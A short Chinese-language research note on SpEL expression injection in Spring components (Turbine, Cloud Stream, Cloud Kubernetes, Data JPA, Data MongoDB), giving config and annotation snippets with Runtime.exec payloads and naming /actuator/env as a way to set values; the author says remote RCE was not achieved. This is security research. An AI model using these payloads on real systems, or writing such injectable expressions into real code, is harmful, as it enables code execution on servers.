# Spel research

​	Spel的应用场景总结下来就是：配置与注解。尤其在配置中，常处于application.yml这样的地方。由于/actuator/env能够设置环境变量，因此便有了研究的想法。但是以下都不能达到远程RCE的效果，但是可作为思路提供参考。（其他组件依赖存在，暂无法提供）

研究的情况主要有以下组件，其他也挖掘寻找了，但感觉与其下大同小异:

+ spring-cloud-starter-netflix-turbine
+ spring-cloud-stream
+ Spring-cloud-kubernetes
+ Spring-data-jpa

+ Spring-data-mongodb

## spring-cloud-starter-netflix-turbine(application.yml)

```
turbine.cluster-name-expression="T(Runtime).getRuntime().exec('calc')"
```

## spring-cloud-stream(注解)

```
@StreamListener(value = Sink.INPUT, condition = "T(Runtime).getRuntime().exec('calc')")
```

## Spring-cloud-kubernetes(application.yml)

```
spring.cloud.kubernetes.discovery.filter=T(Runtime).getRuntime().exec('')
```

## Spring-data-jpa(注解)

```
@Query(value="select * from user where id = ?#{T(Runtime).getRuntime().exec('')}", nativeQuery=true)
```

## spring-data-mongodb(注解)

```
@Query(":#{?0}")
User getDataInfo(String info);
```

